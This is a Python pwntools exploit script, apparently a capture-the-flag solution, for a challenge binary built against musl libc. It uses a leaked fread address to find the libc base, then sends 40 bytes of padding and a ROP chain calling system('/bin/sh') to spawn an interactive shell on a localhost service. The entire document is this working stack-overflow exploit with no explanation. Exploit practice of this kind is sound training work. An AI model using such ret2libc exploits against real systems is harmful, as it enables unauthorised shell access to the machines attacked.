#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("musl-1.2.3-r4.so", False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5006)

    return r


def main():
    r = conn()

    r.recvuntil(b"fread() at: ")
    fread = int(r.recvline().decode().strip(), 16)
    libc.address = fread - libc.sym.fread

    log.info(f"libc at {hex(libc.address)}")

    pop_rdi = libc.address + 0x0000000000015c99
    system = libc.sym.system
    ret = libc.address + 0x0000000000015085
    bin_sh = next(libc.search(b"/bin/sh"))

    rop = flat(
        p64(pop_rdi),
        p64(bin_sh),
        p64(ret),
        p64(system)
    )

    padding = b"A"*40
    r.sendline(padding + rop)
    r.interactive()


if __name__ == "__main__":
    main()
